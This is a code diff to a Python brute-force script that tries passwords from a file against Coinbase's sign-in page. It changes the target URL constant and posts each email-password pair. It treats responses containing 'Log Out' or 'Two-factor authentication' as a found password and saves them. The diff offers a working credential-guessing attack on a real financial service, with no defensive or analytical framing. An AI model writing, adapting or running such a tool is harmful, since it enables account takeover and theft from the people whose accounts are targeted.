@@ -10,7 +10,7 @@ if sys.version_info[0] != 3:
 
 PASSWORD_FILE = "passwords.txt"
 MIN_PASSWORD_LENGTH = 7
-POST_URL = 'https://www.coinbase.com/signinl'
+GET_URL = 'https://www.coinbase.com/signin?locale=pt'
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
@@ -37,7 +37,7 @@ def is_this_a_password(email, index, password):
         PAYLOAD, COOKIES = create_form()
         PAYLOAD['email'] = email
     PAYLOAD['pass'] = password
-    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    r = requests.post(GET_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
     if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
         open('temp', 'w').write(str(r.content))
         print('\npassword found is: ', password)
